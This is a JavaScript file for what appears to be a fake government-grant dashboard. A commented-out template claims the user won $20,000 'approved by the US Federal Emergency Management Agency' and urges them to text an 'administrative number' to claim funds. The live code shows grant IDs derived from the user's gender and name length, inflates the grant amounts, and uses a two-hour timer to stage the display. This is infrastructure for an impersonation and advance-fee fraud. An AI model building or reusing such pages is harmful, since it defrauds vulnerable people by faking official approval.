const dashboardPage = document.querySelector('.dashboard-div')

    // setTimeout(function() {
       
    //     dashboardPage.innerHTML = ` <h3>
    //           Congratulations <span class="firstname">firstname</span> <span class="lastname">lastname</span>,
    //           </h3>
    //           <div class="winning-message-div">
    //             <p class="greeting-text hide-text winning-message">
    //               Yep, that's right. Congrats Welcome back on board
    //               <span class="firstname">firstname</span>
    //               <span class="lang">lastname</span>; Your Grant Application has
    //               been approved successfully! You Just won a Grant payment of
    //               $<span class="amount-won">20,000</span> on
    //               <span class="grant-won-date">november 21 2010</span>.</p>
  
    //               <div class="mb-3 submit-div col-12">
    //                <button class="amount-won-btn btn btn-success">
    //                 Grant amount: $<span class="amount-won-span">20,000</span>
  
    //                </button>
    //               </div>
                  
    //               <div class="new-p-text">
    //                 <p>
    //                 You have been luckily selected as part of our Successful winners for the day. We have thousands of applications daily but We only pick few winner(s). 
    //                 Your patience just paid off!
    //                 Your application has been successfully approved by the Federal Government. 
                  
    //                 We have
    //                 thousands of applications daily but We only pick few winner(s)
    //                 in a day.Your patience just paid off. You just won a grant of
    //                 $<span class="amount-won-span">20,000</span>! Your application has been successfully
    //                 approved by the US Federal Emergency Management Agency; wait no
    //                 longer.
    //                 </p>
    //                 <div class="mb-3 grant-status-div ">
    //                 <h3 class="grant-status-after">Grant Status:</h3>
    //                   <button class="approved-btn btn btn-success">
    //                    approved
    //                   </button>
    //                  </div>
  
    //                <p> Simply text the administrative number with your grant
    //                code on how to receive your funds. Grant id: <span class="grantid" style="color: navy;">123456</span>
  
    //                Congratulations once again
    //                <span class="firstname">firstname</span>
    //                 <span class="lastname">lastname</span>!
    //                </p>
    //             </div> 
  
  
    //             <div class="grant-success-img-div">
    //              <img
    //               src="./images/grant-success.jpeg"
    //               alt=""
    //               class="grant-success-img"
    //              />
    //             </div>
               
    //           <div class="payment-mode">
    //             <div class="claim-payment-div">
    //               <button class=" btn btn-success w-100 claim-payment-btn" onclick="paymentMethod()">
    //               claim my payment
    //               </button>
    //            </div>
    //           </div>`
    // }, 1000)


const afterPayment = document.querySelector('.after-payment');
const claimBtn = document.querySelector('.claim-payment-btn')
const btns = document.querySelectorAll('.btn')
const  firstName = document.querySelectorAll('.firstname')
const lastName = document.querySelectorAll('.lastname')
const firstAmount = document.querySelector('.first-amount')
const secondAmount = document.querySelector('.second-amount') 
const grantId = document.querySelector('.grantid')
const amoutWon = document.querySelector('.amount-won')
const amountWonTwo = document.querySelector('.amount-won-span')
const amountWonBtn = document.querySelector('.amount-won-btn-span')
const text = document.querySelector('.greeting-text')
const beforeTwoHours = document.querySelector('.before-two-hrs')
const afterTwoHours = document.querySelector('.after-two-hrs')
const preloader = document.querySelector('.preloader')

console.log(beforeTwoHours, afterTwoHours)



function paymentMethod() {
  afterPayment.classList.toggle('show-link')
}

// btns.forEach(btn => {
//   console.log(btn)
//   btn.addEventListener('click', function(e) {
//     e.preventDefault()
//   })
// })

//  get user details
let url = 'https://dateapi-app.herokuapp.com/user/'
let h = new Headers()
const token = JSON.parse(localStorage.getItem('myToken'))
h.append('Authorization', `Bearer ${token}`)
h.append('Accept', 'applciation/json')

let response = fetch(url, {
  method: 'GET',
  headers: h
  
})
.then(res =>  res.json()) 
.then(data =>  {
  console.log(data)
  firstName.forEach(first => {
    first.innerHTML = data.firstname
  })
  lastName.forEach(last => {
    last.innerHTML = data.lastname
  })

if(data.gender == 'female' && data.firstname.length < 6 ) {
  grantId.innerHTML = 345685 
} else if(data.gender == 'female' && data.firstname.length >= 6) {
  grantId.innerHTML = 451290
}  else if(data.gender == 'male' && data.lastname.length < 6) {
  grantId.innerHTML = 456784
} else if(data.gender == 'male' && data.firstname.length >= 6) {
  grantId.innerHTML = 930154
} else {
  grantId.innerHTML = 569813
}

  amoutWon.innerHTML = Number(data.grant) + 2245 
  amountWonTwo.innerHTML =  Number(data.grant) + 2245 
  amountWonBtn.innerHTML =  Number(data.grant) + 2245 

 firstAmount.innerHTML = data.grant
 secondAmount.innerHTML = Number(data.grant) + 4000

})
const img = document.querySelector('.user-img')
const imgFooter = document.querySelector('.user-img-footer')

let url2 = 'https://dateapi-app.herokuapp.com/image/'
let h2 = new Headers()
h2.append('Authorization', `Bearer ${token}`)
h2.append('Accept', 'application/json')
h2.append('Content-Type', 'application/json')

try {
  let response2 = fetch(url2, {
    method: 'GET',
    headers: h2
  })
  .then(res2 => res2.json())
  .then(data2 =>  {
    console.log(data2);
    img.src = data2[0].image_url
    imgFooter.src =  data2[0].image_url
  })
} catch (error) {
  console.log(error)
}



//  time lag diisplay after 2hrs

let url3 = 'https://dateapi-app.herokuapp.com/user/time'
let h3 = new Headers()
h3.append('Authorization', `Bearer ${token}`)
h3.append('Accept', 'application/json')
h3.append('Content-Type', 'application/json')
try {
  let response2 = fetch(url3, {
    method: 'POST',
    headers: h3
  })
  .then(res2 => res2.json())
  .then(data3 => {
    console.log(data3)
    if(data3 === true) {
     beforeTwoHours.classList.add('hide')
     afterTwoHours.classList.add('show')
     preloader.classList.add('hide')
    }  else if(data3 === false ) {
      beforeTwoHours.classList.add('show')
      afterTwoHours.classList.add('hide')
      preloader.classList.add('hide')
    } else {
      preloader.classList.add('show')
      beforeTwoHours.classList.add('hide')
      afterTwoHours.classList.add('hide')
      preloader.classList.add('hide')
    }

   

  })
} catch (error) {
  console.log(error)
}
